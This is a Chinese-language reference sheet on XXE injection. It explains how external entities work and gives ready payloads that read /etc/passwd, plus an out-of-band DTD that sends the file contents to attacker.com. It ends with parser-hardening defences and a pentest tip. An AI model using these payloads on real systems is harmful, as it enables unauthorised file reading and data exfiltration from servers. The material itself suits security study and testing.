# XML 外部实体注入 (XXE)

## 概述
适用于 **XML 解析器未禁用外部实体** 的应用场景。攻击者通过构造带有外部实体的 XML 输入，可以在受攻击目标上读取本地文件、触发服务端请求，甚至实现数据外带（OOB）攻击。

## 攻击原理
1. **外部实体（External Entity）**：在 DTD 中使用 `SYSTEM` 关键字引用外部资源（文件、http URL 等），解析器会在解析阶段将其内容加载到 XML 文档中。  
2. **外部 DTD**：攻击者提供指向自定义 DTD 的 URI，解析器会读取并执行该 DTD，从而可以嵌套实体、实现 `%eval;` 等技巧，完成数据外带。  
3. **过滤与限制**：多数现代库默认禁用外部实体，但若未显式关闭，仍存在风险。

## 常用 Payload

### 1. 基本 XXE（读取本地文件）
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```
> **说明**：将 `file:///etc/passwd` 替换为任意目标路径即可读取对应文件内容。

### 2. 外部 DTD + OOB 数据外带
#### 2.1 攻击者控制的外部 DTD（`xxe.dtd`）
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

#### 2.2 触发方式（在目标 XML 中引用外部 DTD）
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">
  %xxe;
]>
<foo>&xxe;</foo>
```
> **原理**  
> 1. 解析器加载 `http://attacker.com/xxe.dtd`，该 DTD 定义了 `file` 实体指向目标文件。  
> 2. `%eval;` 实体把 `file` 的内容嵌入到外部请求的 URL 参数中，形成 `http://attacker.com/?data=<file content>`。  
> 3. 目标服务器向攻击者控制的 HTTP 服务器发起请求，完成 **OOB（Out‑of‑Band）** 数据外带。

> **注意**：若目标过滤了 `SYSTEM` 关键字或禁用了外部 DTD，上述 Payload 将失效。

## 防御与注意事项

| 防御措施 | 说明 |
|---|---|
| **禁用外部实体** | 在解析器配置中设置 `Feature.FEATURE_EXTERNAL_GENERAL_ENTITIES` 为 `false`，或使用安全的默认配置。 |
| **禁用外部 DTD** | 通过 `Feature.FEATURE_EXTERNAL_DTD` 为 `false` 阻止加载外部 DTD。 |
| **白名单过滤** | 只允许已知的安全 DTD 或模式文件，拒绝未知来源。 |
| **限制文件访问** | 对解析进程使用最小权限，防止读取敏感文件。 |
| **日志审计** | 记录异常 XML 输入，特别是包含 `SYSTEM`、`PUBLIC` 关键字的请求。 |

> **实战提示**：在实际渗透测试中，需先确认目标是否允许外部实体、是否解析外部 DTD；若两者皆被禁用，可考虑其他 XML‑相关的攻击面（如 XSLT 注入、XPath 注入等）。

---

*以上内容保留了原始文档中的全部关键信息，已去除重复段落并按「概述 → 原理 → Payload 示例 → 防御」分类呈现，便于快速查阅与实际使用。*